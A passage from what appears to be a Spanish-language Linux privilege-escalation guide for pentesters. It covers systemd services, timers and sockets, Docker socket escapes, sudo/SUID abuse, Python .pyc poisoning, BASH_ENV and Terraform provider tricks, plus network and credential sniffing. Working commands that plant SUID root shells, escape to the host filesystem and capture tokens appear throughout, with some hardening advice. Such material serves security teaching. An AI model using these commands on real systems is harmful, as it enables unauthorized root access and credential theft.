Comprueba si puedes escribir en algún archivo `.service`. Si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** se **inicie**, **reinicie** o **detenga** el servicio (quizá tengas que esperar a que se reinicie la máquina).\
Por ejemplo, crea tu backdoor dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicios con permisos de escritura

Ten en cuenta que, si tienes **permisos de escritura sobre los binarios que ejecutan los servicios**, puedes sustituirlos por backdoors para que, cuando se vuelvan a ejecutar los servicios, se ejecuten los backdoors.

### PATH de systemd: rutas relativas

Puedes ver el PATH que usa **systemd** con:

```bash
systemctl show-environment
```

Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, es posible que puedas **escalar privilegios**. Debes buscar **rutas relativas** en archivos de configuración de servicios, como:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Luego, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro de la carpeta PATH de systemd en la que puedas escribir y, cuando se solicite al servicio ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **backdoor** (por lo general, los usuarios sin privilegios no pueden iniciar ni detener servicios, pero comprueba si puedes usar `sudo -l`).

**Obtén más información sobre los servicios con `man systemd.service`.**

## **Temporizadores**

Los **temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` y que controlan archivos `**.service**` o eventos. Los **temporizadores** pueden usarse como alternativa a cron, ya que cuentan con compatibilidad integrada para eventos de hora de calendario y eventos de tiempo monotónico, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los temporizadores con:

```bash
systemctl list-timers --all
```

### Temporizadores modificables

Si puedes modificar un temporizador, puedes hacer que ejecute algunas unidades existentes de systemd.unit (como un `.service` o un `.target`).

```bash
Unit=backdoor.service
```

En la documentación puedes leer qué es la unidad:

> La unidad que se activa cuando vence este temporizador. El argumento es el nombre de una unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor corresponde de forma predeterminada a un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba). Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador sean idénticos, excepto por el sufijo.

Por lo tanto, para abusar de este permiso tendrías que:

- Encontrar alguna unidad de systemd (como un `.service`) que **esté ejecutando un binario con permisos de escritura**
- Encontrar alguna unidad de systemd que **esté ejecutando una ruta relativa** y sobre cuyo **PATH de systemd** tengas **permisos de escritura** (para suplantar ese ejecutable)

**Obtén más información sobre los temporizadores con `man systemd.timer`.**

### **Habilitar un temporizador**

Para habilitar un temporizador necesitas privilegios de root y ejecutar:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Ten en cuenta que el **timer** se **activa** creando un enlace simbólico a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Los Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma máquina o entre máquinas diferentes dentro de modelos cliente-servidor. Utilizan archivos de descriptor estándar de Unix para la comunicación entre computadoras y se configuran mediante archivos `.socket`.<sup>[[14]](#references)</sup>

Los sockets se pueden configurar mediante archivos `.socket`.

**Aprende más sobre sockets con `man systemd.socket`.** En este archivo se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero en conjunto sirven para **indicar dónde escuchará** el socket (la ruta del archivo de socket AF_UNIX, la dirección IPv4/6 o el número de puerto en el que escuchará, etc.)
- `Accept`: Recibe un argumento booleano. Si es **true**, se **inicia una instancia del servicio para cada conexión entrante** y solo se le pasa el socket de conexión. Si es **false**, los propios sockets de escucha se **pasan a la unidad de servicio iniciada** y se inicia una sola unidad de servicio para todas las conexiones. Este valor se ignora en el caso de sockets de datagramas y FIFOs, donde una única unidad de servicio gestiona incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por motivos de rendimiento, se recomienda escribir los nuevos daemons de forma que sean compatibles con `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Reciben una o más líneas de comandos, que se **ejecutan antes** o **después** de crear y enlazar los **sockets**/FIFOs de escucha, respectivamente. El primer elemento de la línea de comandos debe ser un nombre de archivo absoluto, seguido de los argumentos del proceso.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionales que se **ejecutan antes** o **después** de cerrar y eliminar los **sockets**/FIFOs de escucha, respectivamente.
- `Service`: Especifica el nombre de la unidad de **servicio que se activará** ante el **tráfico entrante**. Este ajuste solo se permite en sockets con Accept=no. De forma predeterminada, se usa el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Archivos .socket con permisos de escritura

Si encuentras un archivo `.socket` con permisos de **escritura**, puedes **añadir** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente tendrás que esperar hasta que se reinicie la máquina.**\
_Observa que el sistema debe estar usando la configuración de ese archivo de socket o el backdoor no se ejecutará_

### Activación de sockets + ruta de unidad con permisos de escritura (crear un servicio faltante)

Otra configuración incorrecta de alto impacto es:

- una unidad de socket con `Accept=no` y `Service=<name>.service`
- falta la unidad de servicio a la que se hace referencia
- un atacante puede escribir en `/etc/systemd/system` (u otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service` y luego generar tráfico al socket para que systemd cargue y ejecute el nuevo servicio como root.

Flujo rápido:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets con permisos de escritura

Si **identificas algún socket con permisos de escritura** (_ahora hablamos de Unix Sockets, no de los archivos de configuración `.socket`_), **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar Unix Sockets

```bash
netstat -a -p --unix
```

### Conexión directa

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Ejemplo de explotación:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets escuchando solicitudes HTTP** (_no me refiero a archivos .socket, sino a archivos que actúan como sockets Unix_). Puedes comprobarlo con:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Si el socket **responde a una petición HTTP**, entonces puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Socket de Docker con permisos de escritura

El socket de Docker, que suele encontrarse en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. De forma predeterminada, el usuario `root` y los miembros del grupo `docker` tienen permisos de escritura. Tener acceso de escritura a este socket puede permitir una escalada de privilegios. A continuación, se explica cómo hacerlo y se presentan métodos alternativos para cuando la CLI de Docker no está disponible.

#### **Escalada de privilegios con la CLI de Docker**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios con los siguientes comandos:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Estos comandos permiten ejecutar un contenedor con acceso root al sistema de archivos del host.

#### **Uso directo de la API de Docker**

Si no está disponible la CLI de Docker, todavía es posible abusar del socket de Docker mediante HTTP sin procesar a través del socket Unix. El flujo más confiable es:

- crear un contenedor auxiliar de larga duración con el directorio raíz del host montado mediante bind
- iniciarlo
- crear una instancia de `exec` dentro de ese contenedor auxiliar
- iniciar la instancia de `exec` y leer la salida a través de la API

**Listar imágenes de Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Crear e iniciar un contenedor auxiliar**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Crear una instancia de exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Inicia la instancia de exec y lee la salida**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Este patrón suele ser más robusto que intentar controlar `attach` manualmente con `socat` o `nc -U`. Una vez que puedas crear un helper con `/:/host`, puedes usar instancias adicionales de `exec` para leer archivos como `/host/root/...`, añadir claves SSH en `/host/root/.ssh` o modificar archivos de inicio del host.

### Otros

Ten en cuenta que, si tienes permisos de escritura sobre el socket de Docker porque estás **dentro del grupo `docker`**, tienes [**más formas de escalar privilegios**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si la [**API de Docker está escuchando en un puerto**, también puedes comprometerla](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de los contenedores o abusar de los runtimes de contenedores para escalar privilegios** en:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Escalada de privilegios con Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página, ya que **puede que puedas abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Escalada de privilegios con **RunC**

Si descubres que puedes usar el comando **`runc`**, lee la siguiente página, ya que **puede que puedas abusar de él para escalar privilegios**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado **sistema de comunicación entre procesos (IPC)** que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado teniendo en cuenta los sistemas Linux modernos, ofrece un framework robusto para distintas formas de comunicación entre aplicaciones.<sup>[[16]](#references)</sup>

El sistema es versátil y admite IPC básico que mejora el intercambio de datos entre procesos, de forma similar a los **sockets de dominio UNIX mejorados**. Además, permite difundir eventos o señales, facilitando la integración entre los componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música silencie el sonido, mejorando la experiencia del usuario. D-Bus también admite un sistema de objetos remotos que simplifica las solicitudes de servicios y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona con un **modelo de permitir/denegar** que gestiona los permisos de los mensajes (llamadas a métodos, emisiones de señales, etc.) según el efecto acumulativo de las reglas de política coincidentes. Estas políticas especifican las interacciones con el bus y podrían permitir la escalada de privilegios mediante la explotación de estos permisos.

A continuación se muestra un ejemplo de una política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, que detalla los permisos del usuario root para poseer, enviar mensajes a y recibir mensajes de `fi.w1.wpa_supplicant1`.

Las políticas que no especifican un usuario o grupo se aplican de forma universal, mientras que las políticas del contexto «default» se aplican a todos los casos no cubiertos por otras políticas específicas.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Aprende a enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Si una entrada activa de `/etc/inetd.conf` ejecuta `telnetd` de GNU Inetutils como root, comprueba la versión del binario configurado y el listener local, incluso si el puerto solo está enlazado a loopback. GNU Inetutils de la versión 1.9.3 a la 2.7 tenía un [bypass de autenticación de telnet](https://seclists.org/oss-sec/2026/q1/89) en el que `USER` proporcionado por el cliente llegaba a `login -f` (CVE-2026-24061). Un proceso o una cadena de versión son indicios; confirma el estado del parche del proveedor y cuál es el daemon real antes de considerarlo vulnerable. La [guía de Telnet](../../../network-services-pentesting/pentesting-telnet.md) contiene más detalles.

### Triage rápido del filtrado de salida

Si el host puede ejecutar comandos, pero las callbacks fallan, distingue rápidamente entre filtrado de DNS, transporte, proxy y rutas:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Puertos abiertos

Comprueba siempre los servicios de red que se estén ejecutando en la máquina y con los que no pudiste interactuar antes de acceder a ella:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Clasifica los listeners según el destino de bind:

- `0.0.0.0` / `[::]`: expuestos en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo locales (buenos candidatos para tunnel/forward).
- IP internas específicas (p. ej., `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente solo son accesibles desde segmentos internos.

### Flujo de trabajo para evaluar servicios solo locales

Cuando comprometes un host, los servicios enlazados a `127.0.0.1` suelen volverse accesibles por primera vez desde tu shell. Un flujo de trabajo local rápido es:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS como escáner de red (modo solo de red)

Además de las comprobaciones locales de PE, linPEAS puede funcionar como un escáner de red especializado. Usa los binarios disponibles en `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (omitiendo el resto de las comprobaciones de escalada de privilegios).

### Sniffing

Comprueba si puedes sniffear el tráfico. Si puedes, podrías capturar algunas credenciales.

```
timeout 1 tcpdump
```

Comprobaciones prácticas rápidas:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios internos exponen tokens/cookies/credenciales allí:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Captura ahora, analiza después:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Usuarios

### Enumeración genérica

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden **login** y cuáles tienen **privilegios de root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID grande

Algunas versiones de Linux se vieron afectadas por un bug que permite a usuarios con **UID > INT_MAX** escalar privilegios. Más información: [aquí](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aquí](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [aquí](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** usando: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que pueda otorgarte privilegios de root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante en el portapapeles (si es posible)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Política de contraseñas

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** usando esa contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer brute-force a los usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer brute-force a los usuarios.

## Abusos de PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta de $PATH**, quizá puedas escalar privilegios **creando una backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ejecutar otro usuario (idealmente root) y que **no se cargue desde una carpeta ubicada antes que tu carpeta escribible en $PATH**.

### SUDO y SUID

Puede que tengas permitido ejecutar algún comando usando sudo o que tenga el bit suid. Compruébalo con:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando**.<sup>[[8]](#references)</sup> Por ejemplo:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

La configuración de sudo podría permitir que un usuario ejecute ciertos comandos con los privilegios de otro usuario sin conocer la contraseña.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`, por lo que ahora es trivial obtener una shell añadiendo una clave SSH al directorio de `root` o llamando a `sh`.

```
sudo vim -c '!sh'
```

### Comparación sin comillas de Bash en un script de sudo

En Bash, el lado derecho de `[[ "$protected" == $candidate ]]` es un patrón. Si un script de sudo con capacidad de ejecutarse como root asigna `candidate` a partir de un archivo controlado por quien lo invoca, un valor como `prefix*` puede coincidir con el comienzo de una cadena protegida. Las distintas rutas de éxito y error podrían entonces exponer un oráculo de prefijos. Pon comillas en el lado derecho (`[[ "$protected" == "$candidate" ]]`) cuando se pretenda una igualdad literal. Revisa los argumentos reales de sudo, el origen de los datos de entrada y el comportamiento observable de las ramas antes de considerar que una comparación sin comillas es explotable. El [manual de GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) define este comportamiento de patrones.

### Archivos de proyecto de PrusaSlicer con sudo

Conviene revisar una autorización irrestricta de sudo para ejecutar `prusaslicer` o `prusa-slicer` con capacidad de ejecutarse como root si quien lo invoca puede elegir el proyecto `.3mf` que se procesa. Un proyecto puede incluir un script de posprocesamiento que se ejecuta al exportar G-code; los proyectos manipulados podrían ejecutar comandos en PrusaSlicer hasta la versión 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Antes de concluir que se puede atravesar el límite de privilegios, confirma la regla de sudo efectiva, la versión del binario y los parches del proveedor, el origen del proyecto y si se ejecuta la ruta de exportación pertinente. Un argumento de proyecto fijo o una política `NOEXEC` efectiva pueden cambiar el resultado. Encontrar el slicer instalado no demuestra por sí solo que exista una vía de escalada de privilegios.

### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** al ejecutar algo:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Este ejemplo, **basado en la máquina Admirer de HTB**, era **vulnerable** al **PYTHONPATH hijacking** para cargar una librería arbitraria de Python al ejecutar el script como root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Envenenamiento de `__pycache__` / `.pyc` escribible en imports de Python permitidos por sudo

Si un **script de Python permitido por sudo** importa un módulo cuyo directorio de paquete contiene un **`__pycache__` escribible**, quizá puedas reemplazar el `.pyc` en caché y conseguir ejecución de código como el usuario privilegiado en el siguiente import.<sup>[[30]](#references)</sup>

- Por qué funciona:
  - CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - El intérprete valida el **encabezado** (magic + metadatos de timestamp/hash vinculados al código fuente) y luego ejecuta el objeto de código serializado almacenado después de ese encabezado.
  - Si puedes **eliminar y volver a crear** el archivo en caché porque el directorio es escribible, aun así puedes reemplazar un `.pyc` propiedad de root y no escribible.
- Ruta habitual:
  - `sudo -l` muestra un script o wrapper de Python que puedes ejecutar como root.
  - Ese script importa un módulo local desde `/opt/app/`, `/usr/local/lib/...`, etc.
  - El directorio `__pycache__` del módulo importado es escribible por tu usuario o por cualquiera.

Enumeración rápida:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Si puedes inspeccionar el script privilegiado, identifica los módulos importados y su ruta de caché:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Flujo de abuso:

1. Ejecuta una vez el script permitido por sudo para que Python cree el archivo de caché legítimo, si todavía no existe.
2. Lee los primeros 16 bytes del `.pyc` legítimo y reutilízalos en el archivo envenenado.
3. Compila un objeto de código de payload, conviértelo con `marshal.dumps(...)`, elimina el archivo de caché original y vuelve a crearlo con la cabecera original seguida de tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido por sudo para que la importación ejecute tu payload como root.

Notas importantes:

- Reutilizar la cabecera original es clave porque Python compara los metadatos de la caché con el archivo fuente, no comprueba si el cuerpo del bytecode realmente coincide con el código fuente.
- Esto resulta especialmente útil cuando el archivo fuente pertenece a root y no se puede escribir en él, pero sí en el directorio `__pycache__` que lo contiene.
- `PYTHONDONTWRITEBYTECODE=1` y `python -B` impiden que Python escriba archivos `.pyc` nuevos; **no** impiden que cargue una caché ya válida que un atacante haya reemplazado. El límite crítico es si un usuario con menos privilegios puede reemplazar una caché que la importación privilegiada aceptará. Antes de cargar el bytecode en caché, Python comprueba los metadatos de fecha y tamaño o de hash. Consulta la [referencia de importación de Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) y la [documentación de la línea de comandos](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Estructura mínima de una prueba de concepto:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Asegúrate de que ningún directorio de la ruta de importación de Python con privilegios pueda ser escrito por usuarios con pocos privilegios, incluido `__pycache__`.
- Audita la propiedad y los permisos de los directorios de caché, incluidos los archivos `.pyc` existentes. Desactivar las escrituras de bytecode puede reducir la creación de nuevas cachés, pero no neutraliza una caché existente que se pueda reemplazar.
- Trata los módulos locales de Python y los directorios de caché que se puedan escribir igual que tratarías los scripts de shell o las bibliotecas compartidas que se puedan escribir y que ejecuta root.

### BASH_ENV preservado mediante sudo env_keep → shell de root

Si sudoers preserva `BASH_ENV` (p. ej., `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio de Bash no interactivo para ejecutar código arbitrario como root al invocar un comando permitido.<sup>[[24]](#references)</sup>

- Por qué funciona: En shells no interactivos, Bash evalúa `$BASH_ENV` y carga ese archivo antes de ejecutar el script de destino. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si sudo preserva `BASH_ENV`, tu archivo se carga con privilegios de root.<sup>[[23]](#references)</sup>

- Requisitos:
  - Una regla de sudo que puedas ejecutar (cualquier destino que invoque `/bin/bash` de forma no interactiva o cualquier script de Bash).
  - `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - Elimina `BASH_ENV` (y `ENV`) de `env_keep`; prefiere `env_reset`.
  - Evita los wrappers de shell para los comandos permitidos por sudo; usa binarios mínimos.
  - Considera el registro de E/S de sudo y las alertas cuando se usan variables de entorno preservadas.

### Terraform mediante sudo con HOME preservado (!env_reset)

Cuando sudo permite ejecutar Terraform como un usuario con más privilegios, `!env_reset` es una pista para comprobar qué variables de entorno sobreviven realmente a esa regla específica. Confirma el valor efectivo de `HOME` o `TF_CLI_CONFIG_FILE` antes de considerar que un `.terraformrc` o `terraform.rc` modificable por quien invoca el comando es la configuración activa de la CLI. Una entrada `provider_installation.dev_overrides` solo importa si el comando de Terraform fijado carga ese provider y quien invoca el comando puede colocar su ejecutable en el directorio seleccionado.<sup>[[25]](#references)</sup>

- Apunta el provider requerido a un directorio modificable y coloca un plugin malicioso con el nombre del provider (p. ej., `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform fallará el handshake del plugin Go, pero ejecutará el payload como root antes de morir y dejará una shell SUID.

### Anulaciones de TF_VAR + bypass de validación de symlink

